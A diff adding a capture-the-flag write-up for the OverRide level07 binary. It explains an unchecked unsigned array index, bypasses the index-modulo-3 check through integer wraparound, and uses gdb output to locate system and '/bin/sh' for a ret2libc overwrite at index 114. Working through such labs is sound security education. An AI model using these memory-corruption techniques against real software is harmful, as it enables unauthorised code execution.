@@ -1,0 +1,87 @@
+For this exercise we have a binary which reads on stdin and ask for command to 
+manage the storage service.
+
+There are 3 commands : 
+store
+read
+quit
+
+With store we can choose a number to store and an index on where to store that
+number.
+With read we can choose an index to read on.
+
+By trying few input (positive and negative) we understand that the index type
+is an unsigned int. That index is never checked, it is possible to send a negative
+index, it makes the unsigned overflow.
+
+Input command: store
+ Number: 42
+ Index: -2
+ Completed store command successfully
+Input command: read
+ Index: -2
+ Number at data[4294967294] is 42
+ Completed read command successfully
+
+We can't store value at index : index % 3 == 0.
+In the assembly, we can see the size of the array (100)
+
+   0x0804879a <+119>:	mov    $0x64,%edx
+(gdb) p/d 0x64
+$1 = 100
+
+We could also find the system and "/bin/sh" addresses :
+
+(gdb) p &system
+$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) info proc  map
+process 2942
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fd8000 0xf7fdb000     0x3000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+
+With those two, we can try a ret2libc.
+
+We tried to fuzz input to get a segfault, without result.
+
+To bypass the condition on the index, we made a script to generate and valid
+index : get_index.c
+
+The binary removes the environment variable and also there is a protection on 
+the stack. It's called STACK CANARY.
+
+We can control EIP at index 114 : 
+
+Input command: store
+ Number: 43690    (AAAA in hexa)
+ Index: 1073741938   (114)
+ Completed store command successfully
+Input command: quit
+Segmentation fault (core dumped)
+level07@OverRide:~$ dmesg | tail -1
+[20188.619816] level07[3217]: segfault at aaaa ip 000000000000aaaa sp 00000000ffffd720 error 14 in level07[8048000+1000]
+
+As the array is 100 long, we can try to store number after that range by storing 
+at :
+
+index -> system
+index + 2 -> "/bin/sh"
+
+After few tries we could overwrite the call to __libc_start_main at index 114.
